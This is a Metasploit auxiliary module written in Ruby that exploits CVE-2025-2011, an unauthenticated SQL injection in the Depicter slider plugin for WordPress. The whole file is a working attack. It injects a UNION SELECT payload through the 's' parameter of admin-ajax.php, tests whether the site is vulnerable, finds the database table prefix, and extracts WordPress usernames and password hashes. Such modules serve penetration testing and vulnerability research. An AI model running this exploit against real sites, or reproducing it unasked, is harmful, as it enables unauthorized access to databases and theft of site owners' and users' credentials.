##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Depicter Plugin SQL Injection (CVE-2025-2011)',
        'Description' => %q{
          The Slider & Popup Builder by Depicter plugin for WordPress <= 3.6.1
          is vulnerable to unauthenticated SQL injection via the 's' parameter
          in admin-ajax.php.
        },
        'Author' => [
          'Muhamad Visat',     # Vulnerability discovery
          'Valentin Lobstein'  # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-2011'],
          ['EDB', '52285'],
          ['WPVDB', '6f894272-3eb6-4595-ae00-1c4b0c0b6564'],
          ['URL', 'https://cloud.projectdiscovery.io/library/CVE-2025-2011'],
          ['URL', 'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Controllers/Ajax/LeadsAjaxController.php?rev=3156664#L179']
        ],
        'DefaultOptions' => {
          'VERBOSE' => true
        },
        'DisclosureDate' => '2025-05-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to the WordPress installation', '/']),
      OptInt.new('COUNT', [true, 'Number of user rows to retrieve (0 for all)', 1]),
      Opt::RPORT(80)
    ])
  end

  class RequestError < StandardError
    attr_reader :failure

    def initialize(failure, message)
      @failure = failure
      super(message)
    end
  end

  def get_sqli_object
    # Per-row extraction avoids group_concat limits; HEX keeps field delimiters
    # in stored usernames and hashes separate from the helper's row format.
    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true, encoder: :hex, safe: true, strict_results: true }) do |payload|
      expr = payload.to_s.strip.gsub(/\s+/, ' ')
      r1, r2, r3, r4, r5 = Array.new(5) { rand(1000..9999) }
      injected = "#{r1}') UNION SELECT #{r2},#{r3},(#{expr}),#{r4},#{r5}-- -"

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => {
          'action' => 'depicter-lead-index',
          's' => injected,
          'perpage' => rand(10..50).to_s,
          'page' => rand(1..3).to_s,
          'orderBy' => 'source_id',
          'order' => %w[ASC DESC].sample,
          'dateStart' => '',
          'dateEnd' => '',
          'sources' => ''
        }
      )

      raise RequestError.new(Failure::Unreachable, 'Depicter SQL request did not receive a response') unless res
      if [401, 403].include?(res.code)
        raise RequestError.new(Failure::NoAccess, "Depicter SQL request was denied (HTTP #{res.code})")
      end
      raise RequestError.new(Failure::UnexpectedReply, "Depicter SQL request returned HTTP #{res.code}") unless res.code == 200

      doc = res.get_json_document
      unless doc.is_a?(Hash) && doc['hits'].is_a?(Array)
        raise RequestError.new(Failure::UnexpectedReply, 'Depicter SQL response did not include a result array')
      end

      if doc['hits'].empty?
        next nil unless @query_operation == :dump

        raise RequestError.new(Failure::UnexpectedReply, 'Depicter user extraction returned no scalar result')
      end
      row = doc['hits'].first
      unless row.is_a?(Hash) && row['content'].is_a?(Hash) && row['content'].key?('id')
        raise RequestError.new(Failure::UnexpectedReply, 'Depicter SQL response did not include a scalar ID')
      end

      value = row['content']['id']
      # SQL NULL is a valid scalar, including a missing default-prefix table.
      # Returning error text or empty text would make indicator zero match.
      if value.nil? || value == ''
        next nil unless @query_operation == :dump

        raise RequestError.new(Failure::UnexpectedReply, 'Depicter user extraction returned an empty scalar')
      end
      unless value.is_a?(String) || value.is_a?(Integer)
        raise RequestError.new(Failure::UnexpectedReply, 'Depicter SQL response included an invalid scalar ID')
      end

      value.to_s
    end
  end

  def check
    prepare_sqli
    return Exploit::CheckCode::Vulnerable('SQL injection test succeeded') if @sqli.test_vulnerable

    Exploit::CheckCode::Safe('SQL injection test did not succeed')
  rescue RequestError => e
    Exploit::CheckCode::Unknown(e.message)
  rescue MySQLi::Common::ResultError => e
    elog('Depicter SQL result validation failed', error: e)
    Exploit::CheckCode::Unknown("Depicter SQL response was invalid: #{e.message}")
  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
    elog('Depicter SQL injection check failed to connect', error: e)
    Exploit::CheckCode::Unknown('Depicter SQL request failed to connect or complete')
  end

  def run
    count = datastore['COUNT']
    unless count.is_a?(Integer) && count >= 0
      raise RequestError.new(Failure::BadConfig, 'COUNT must be zero or greater')
    end

    prepare_sqli
    raise RequestError.new(Failure::NotVulnerable, 'SQL injection test did not succeed') unless @sqli.test_vulnerable

    @query_operation = :prefix
    wordpress_sqli_initialize(@sqli)
    unless @prefix.is_a?(String) && @prefix.match?(/\A[a-zA-Z0-9_]+\z/)
      raise RequestError.new(Failure::UnexpectedReply, 'Unable to identify the WordPress database table prefix')
    end

    @query_operation = :dump
    wordpress_sqli_get_users_credentials(count)
  rescue RequestError => e
    case e.failure
    when Failure::Unreachable
      fail_with(Failure::Unreachable, e.message)
    when Failure::NoAccess
      fail_with(Failure::NoAccess, e.message)
    when Failure::NotVulnerable
      fail_with(Failure::NotVulnerable, e.message)
    when Failure::BadConfig
      fail_with(Failure::BadConfig, e.message)
    else
      fail_with(Failure::UnexpectedReply, e.message)
    end
  rescue MySQLi::Common::ResultError => e
    elog('Depicter user extraction validation failed', error: e)
    fail_with(Failure::UnexpectedReply, "Depicter user extraction failed: #{e.message}")
  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
    elog('Depicter credential collection failed to connect', error: e)
    fail_with(Failure::Unreachable, 'Depicter SQL request failed to connect or complete')
  end

  private

  def prepare_sqli
    @sqli = @prefix = nil
    @query_operation = :probe
    @sqli = get_sqli_object
  end
end
